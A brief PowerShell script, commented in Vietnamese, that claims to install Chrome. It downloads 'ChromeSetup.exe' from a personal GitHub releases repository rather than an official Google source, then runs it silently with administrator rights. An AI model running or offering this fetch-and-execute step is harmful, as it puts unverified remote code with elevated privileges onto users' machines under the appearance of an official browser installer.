# Script để tải xuống và cài đặt Chrome

# Chạy với quyền quản trị viên (Run as Administrator)



$Path = $ENV:TEMP

$Installer = "ChromeSetup.exe"



Write-Host "Đang tải xuống Chrome..."



# Tải file cài đặt

Invoke-WebRequest "https://github.com/hiepvk/ipa/releases/download/exe/ChromeSetup.exe" -OutFile "$Path\$Installer"



Write-Host "Đã tải xuống thành công."

Write-Host "Đang bắt đầu quá trình cài đặt..."



# Chạy trình cài đặt ở chế độ im lặng với quyền quản trị viên

Start-Process -FilePath "$Path\$Installer" -Args "/silent /install" -Verb RunAs -Wait



Write-Host "Cài đặt hoàn tất."

Write-Host "Đang dọn dẹp file cài đặt..."



# Xóa file cài đặt đã tải xuống

Remove-Item "$Path\$Installer" -ErrorAction SilentlyContinue



Write-Host "Hoàn tất."
